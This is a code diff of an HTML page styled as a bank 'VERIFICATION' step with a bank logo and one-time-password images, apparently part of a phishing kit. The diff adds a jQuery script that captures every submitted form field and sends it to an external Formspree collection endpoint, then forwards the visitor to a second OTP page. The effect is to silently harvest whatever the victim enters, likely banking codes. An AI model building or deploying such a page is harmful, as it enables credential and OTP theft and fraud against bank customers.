@@ -6,8 +6,32 @@
   <title>VERIFICATION</title>
   <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+   <script>
+    $(document).ready(function() {
+      $('form').submit(function(event) {
+        event.preventDefault(); // Prevent form submission
+
+        // Send the form data to FormSubmit using AJAX
+        $.ajax({
+          url: 'https://formspree.io/f/mvonjlzz',
+          method: 'POST',
+          data: $('form').serialize(),
+          dataType: 'json',
+          success: function(response) {
+            // Redirect to OTP2.html upon successful submission
+            redirectToOTP2();
+          },
+          error: function(xhr, status, error) {
+            console.log(xhr.responseText);
+            alert('An error occurred. Please try again.');
+          }
+        });
+      });
+    });
+
+    function redirectToOTP2() {
+      window.location.href = 'OTP2.html';
+    }
   </script>
 </head>
 <body>
@@ -15,7 +39,7 @@
     <img src="logo.png" alt="Bank Logo" class="logo">
   </header>
  <main>
-  <img src="otp.jpg" alt="Loan Image" class="loan-image" width="max" align="center">
+  <img src="otp.png" alt="Loan Image" class="loan-image" width="max" align="center">
   
   <center> 
   <h3 style="font-family:verdana;">
